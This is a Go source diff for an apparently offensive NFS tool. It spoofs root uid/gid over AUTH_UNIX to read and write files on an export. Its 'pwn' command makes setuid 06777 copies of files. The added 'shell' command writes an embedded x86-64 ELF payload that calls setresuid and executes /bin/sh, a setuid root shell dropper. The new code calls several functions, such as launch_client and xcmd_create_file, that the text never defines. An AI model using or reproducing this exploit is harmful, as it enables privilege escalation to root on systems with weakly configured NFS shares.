@@ -1,228 +1,98 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
-	"encoding/base64"
-	"flag"
 	"fmt"
 	"io"
 	"os"
+	"path"
 	"strings"
 
 	"github.com/go-nfs/nfsv3/nfs"
 	"github.com/go-nfs/nfsv3/nfs/rpc"
-	"github.com/go-nfs/nfsv3/nfs/util"
 )
 
-type wd_t []string
-
-func (wd wd_t) String() string {
-	if len(wd) == 0 {
-		return "."
-	}
-	return strings.Join(wd, "/")
+type ctx_t struct {
+	mnt *nfs.Target
+	cwd string
 }
 
-func (wd wd_t) append(f string) wd_t {
-	return append(wd, f)
+var commands map[string]func(*ctx_t, string) = make(map[string]func(*ctx_t, string))
+
+func init() {
+	commands["pwn"] = xcmd_pwn
+	commands["shell"] = xcmd_shell
 }
 
 func main() {
-	var machinename string
-	var uid int
-	var gid int
-	var target string
-	var rhost string
-	var debug bool
-	var priv bool
+	launch_client()
+}
 
-	flag.StringVar(&machinename, "machine", "localhost", "machine name")
-	flag.IntVar(&uid, "uid", 0, "uid to become")
-	flag.IntVar(&gid, "gid", 0, "gid to become")
-	flag.StringVar(&target, "target", "/home/james", "path to mount")
-	flag.StringVar(&rhost, "rhost", "localhost", "remote nfs server (needs 111 for portmapping, and whatever nfs will use)")
-	flag.BoolVar(&debug, "debug", false, "enable nfs debugging")
-	flag.BoolVar(&priv, "priv", false, "use privileged port")
-	flag.Parse()
-
-	if debug {
-		util.DefaultLogger.SetDebug(true)
-	}
-
+func client(auth rpc.Auth, rhost string, target string, priv bool, cmd []string) {
 	mount, err := nfs.DialMount(rhost, priv)
 	if err != nil {
 		panic(err)
 	}
 	defer mount.Close()
 
-	auth := rpc.NewAuthUnix(machinename, uint32(uid), uint32(gid))
-
-	mnt, err := mount.Mount(target, auth.Auth())
+	mnt, err := mount.Mount(target, auth)
 	if err != nil {
 		panic(err)
 	}
 	defer mnt.Close()
 
-	cwd := wd_t{}
+	var src io.Reader
+	if len(cmd) > 0 {
+		src = bytes.NewBufferString(strings.Join(cmd, " "))
+	} else {
+		src = os.Stdin
+	}
+	reader := bufio.NewReader(src)
+	ctx := &ctx_t{
+		mnt: mnt,
+		cwd: "/",
+	}
 	for {
-		cmdb := make([]byte, 256)
-		fmt.Printf("[%s] %s> ", target, cwd)
-		n, err := os.Stdin.Read(cmdb)
-		if err != nil {
-			fmt.Println(err)
+		fmt.Printf("%s$ ", path.Join(target, ctx.cwd))
+		input, err := reader.ReadString('\n')
+		if err != nil && err != io.EOF {
+			fmt.Fprint(os.Stderr, err)
 			break
 		}
-		cmd := strings.TrimSpace(string(cmdb[:n]))
+		input = strings.TrimSpace(input)
 
-		if cmd == "exit" {
+		cmd := input
+		args := ""
+		if i := strings.Index(cmd, " "); i > 0 {
+			cmd = input[:i]
+			args = input[i+1:]
+		}
+
+		if cb, found := commands[cmd]; found {
+			cb(ctx, args)
+		} else if cmd != "" {
+			fmt.Fprintf(os.Stderr, "command not found: %s\n", cmd)
+		}
+
+		if err == io.EOF || cmd == "exit" {
 			break
-		} else if cmd == "ls" {
-			if files, err := mnt.ReadDirPlus(cwd.String()); err != nil {
-				fmt.Println(err)
-			} else {
-				for _, f := range files {
-					fmt.Printf("  [%-40s] %5d:%5d (0%04o) %d\n", f.FileName, f.Attr.Attr.UID, f.Attr.Attr.GID, f.Attr.Attr.Mode(), f.Size())
-				}
-			}
-		} else if strings.HasPrefix(cmd, "cd ") {
-			dir := cmd[3:]
-			if dir == ".." && len(cwd) > 0 {
-				cwd = cwd[:len(cwd)-1]
-			} else {
-				cwd = cwd.append(dir)
-			}
-		} else if strings.HasPrefix(cmd, "mkdir ") {
-			dir := cmd[6:]
-			if _, err := mnt.Mkdir(cwd.append(dir).String(), 0777); err != nil {
-				fmt.Println(err)
-			}
-		} else if strings.HasPrefix(cmd, "cat ") {
-			file := cmd[4:]
-			cmd_cat(mnt, cwd.append(file).String())
-		} else if strings.HasPrefix(cmd, "get ") {
-			file := cmd[4:]
-			if _, err := os.Stat(file); err == nil {
-				fmt.Println("error: file already exists")
-			} else {
-				cmd_get(mnt, cwd.append(file).String(), file)
-			}
-		} else if strings.HasPrefix(cmd, "b64get ") {
-			file := cmd[7:]
-			cmd_get(mnt, cwd.append(file).String(), "")
-		} else if strings.HasPrefix(cmd, "put ") {
-			file := cmd[4:]
-			cmd_put(mnt, cwd.append(file).String(), file)
-		} else if strings.HasPrefix(cmd, "b64put ") {
-			file := cmd[7:]
-			cmd_put(mnt, cwd.append(file).String(), "")
-		} else if strings.HasPrefix(cmd, "rm ") {
-			file := cmd[3:]
-			if err := mnt.Remove(cwd.append(file).String()); err != nil {
-				fmt.Println(err)
-			}
-		} else if strings.HasPrefix(cmd, "rmdir ") {
-			file := cmd[6:]
-			if err := mnt.RemoveAll(cwd.append(file).String()); err != nil {
-				fmt.Println(err)
-			}
-		} else if strings.HasPrefix(cmd, "pwn ") {
-			file := cmd[4:]
-			cmd_pwn(mnt, cwd.append(file).String())
-		} else {
-			fmt.Println("unknown command")
 		}
 	}
 }
 
-func cmd_pwn(mnt *nfs.Target, remotepath string) {
-	// you can't open a filehandle with the nfslib, only create.. which is weird.. so we copy instead  ¯\_(ツ)_/¯
-	if fi, err := mnt.Open(remotepath); err != nil {
-		fmt.Println(err)
-	} else {
-		defer fi.Close()
-		create_and_write(mnt, remotepath+".pwn", fi)
-	}
+func xcmd_pwn(ctx *ctx_t, args string) {
+	fn := path.Join(ctx.cwd, args)
+	xcmd_open_file(ctx, fn, func(fr *nfs.File) {
+		xcmd_create_file(ctx, fn+".pwn", func(fw *nfs.File) {
+			io.Copy(fw, fr)
+		})
+	})
 }
 
-func cmd_cat(mnt *nfs.Target, file string) {
-	if f, err := mnt.Open(file); err != nil {
-		fmt.Println(err)
-	} else {
-		defer f.Close()
-		io.Copy(os.Stdout, f)
-	}
-}
-
-func cmd_get(mnt *nfs.Target, remotepath string, localpath string) {
-	if fi, err := mnt.Open(remotepath); err != nil {
-		fmt.Println(err)
-	} else {
-		defer fi.Close()
-
-		if localpath == "" {
-			if data, err := io.ReadAll(fi); err != nil {
-				fmt.Println(err)
-			} else {
-				fmt.Println(base64.StdEncoding.EncodeToString(data))
-			}
-		} else {
-			if fo, err := os.Create(localpath); err != nil {
-				fmt.Println(err)
-			} else {
-				defer fo.Close()
-				io.Copy(fo, fi)
-			}
-		}
-	}
-}
-
-func cmd_put(mnt *nfs.Target, remotepath string, localpath string) {
-	var r io.Reader
-	if localpath == "" {
-		sz := 8192
-		fmt.Printf("max %d bytes>> ", sz)
-		dbuf := make([]byte, sz+10)
-		if n, err := os.Stdin.Read(dbuf); err != nil {
-			fmt.Println(err)
-		} else {
-			if bdata, err := base64.StdEncoding.DecodeString(string(dbuf[:n])); err != nil {
-				fmt.Println(err)
-			} else {
-				r = bytes.NewReader(bdata)
-			}
-		}
-	} else {
-		if fi, err := os.Open(localpath); err != nil {
-			fmt.Println(err)
-		} else {
-			defer fi.Close()
-			r = fi
-		}
-	}
-
-	if r != nil {
-		create_and_write(mnt, remotepath, r)
-	}
-}
-
-func create_and_write(mnt *nfs.Target, remotepath string, fi io.Reader) {
-	if fh, err := mnt.Create(remotepath, 06777); err != nil {
-		fmt.Println(err)
-	} else {
-		if err := mnt.SetAttrByFh(fh, nfs.Sattr3{
-			Mode: nfs.SetMode{
-				SetIt: true,
-				Mode:  06777,
-			},
-		}); err != nil {
-			fmt.Println("could not set mode (still trying to write the file though):", err)
-		}
-
-		if fo, err := mnt.OpenByFh(fh, nil); err != nil {
-			fmt.Println(err)
-		} else {
-			defer fo.Close()
-			io.Copy(fo, fi)
-		}
-	}
+func xcmd_shell(ctx *ctx_t, args string) {
+	xcmd_create_file(ctx, args, func(f *nfs.File) {
+		shell := bytes.NewBuffer([]byte{0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x75, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05})
+		io.Copy(f, shell)
+	})
 }
